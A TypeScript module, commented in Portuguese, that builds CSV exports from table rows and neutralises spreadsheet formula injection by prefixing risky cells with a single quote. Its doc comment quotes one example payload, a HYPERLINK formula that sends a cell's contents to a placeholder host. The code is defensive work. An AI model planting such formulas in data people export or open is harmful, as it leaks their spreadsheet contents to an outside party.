/**
 * Serialização CSV do DataTable.
 *
 * Separado do componente pra poder ser testado (e porque a regra de escape é
 * de segurança, não de apresentação).
 */

/**
 * Escapa uma célula.
 *
 * Além das aspas/vírgula/quebra de linha do formato, desarma **formula
 * injection**: Excel e Google Sheets EXECUTAM a célula que começa com `=`, `+`,
 * `-`, `@`, tab ou CR. Um dado cadastrado como `=HYPERLINK("http://x?"&A1)`
 * vira exfiltração quando alguém abre o CSV exportado. O prefixo de aspa
 * simples neutraliza e não aparece na planilha.
 */
export function escaparCelulaCsv(
	v: string | number | null | undefined,
): string {
	if (v == null) return "";
	let s = String(v);
	if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
	if (
		s.includes(",") ||
		s.includes('"') ||
		s.includes("\n") ||
		s.includes("\r")
	) {
		return `"${s.replace(/"/g, '""')}"`;
	}
	return s;
}

/** Monta o CSV completo (cabeçalho + linhas) a partir de objetos planos. */
export function montarCsv(
	rows: Record<string, string | number | null | undefined>[],
): string {
	if (rows.length === 0) return "";
	const headers = Object.keys(rows[0] ?? {});
	return [
		headers.map(escaparCelulaCsv).join(","),
		...rows.map((r) => headers.map((h) => escaparCelulaCsv(r[h])).join(",")),
	].join("\n");
}
